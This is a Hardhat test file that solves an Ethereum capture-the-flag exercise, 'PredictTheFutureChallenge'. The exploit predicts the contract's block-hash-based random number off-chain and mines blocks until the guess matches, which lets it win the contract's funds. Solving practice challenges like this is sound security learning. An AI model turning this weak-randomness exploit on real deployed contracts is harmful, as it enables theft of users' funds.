import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { solidityPack } from 'ethers/lib/utils';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('PredictTheFutureChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheFutureChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    const guess = 5;

    await target.connect(attacker).lockInGuess(guess, {value: ethers.utils.parseEther("1")});

    while (true) {
      const blockNumber = await ethers.provider.getBlockNumber();
      const block = await ethers.provider.getBlock(blockNumber - 1);

      const blockHash = block.hash;
      const timestamp = block.timestamp;

      const packed = ethers.utils.solidityPack(["bytes32", "uint256"], [blockHash, timestamp]);
      const hash = ethers.utils.keccak256(packed);

      const randomNumber = parseInt(hash.slice(-2), 16) % 10;

      if (randomNumber == guess) {
        await target.connect(attacker).settle();
        break;
      } else {
        await ethers.provider.send("evm_mine", []);
      }
    }
    // expect(await provider.getBalance(target.address)).to.equal(0);
    expect(await target.isComplete()).to.equal(true);
  });
});
